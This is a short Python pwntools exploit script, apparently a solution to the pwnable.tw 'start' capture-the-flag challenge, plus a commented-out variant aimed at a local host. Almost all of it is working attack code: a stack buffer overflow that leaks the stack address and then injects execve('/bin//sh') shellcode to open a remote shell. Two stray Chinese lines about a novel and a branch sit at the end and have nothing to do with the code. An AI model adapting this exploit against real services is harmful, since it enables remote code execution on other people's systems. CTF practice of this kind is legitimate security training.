# #coding=utf-8
# from pwn import *
# import struct

# ret=0xbfc3af40
# #p = process('./stackoverflow') 
# p = remote('10.211.55.8',10001)
# shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
# shellcode+="\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
# shellcode+="\x0b\xcd\x80"

# #p32(ret)==struct.pack("<I",ret)
# payload=shellcode+"A"*(140-len(shellcode))+p32(ret)

# p.send(payload)
# p.interactive()

from pwn import *
HOST = 'chall.pwnable.tw'
PORT = 10000

gad = 0x8048087 #mov    %esp,%ecx

def ExpFirst(ip,port):
	con = remote(ip,port)
	con.recv()  #返回启动start的输出
	payload= "A"*20+p32(gad)
	con.send(payload)
	leak = u32(con.recv(4))
	
	shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
	payload='A'*20+p32(leak+20)+shellcode
	con.recv()
	con.send(payload)
	con.interactive()



ExpFirst(HOST,PORT)

新的小说中添加的元素

在新的分之下进行修改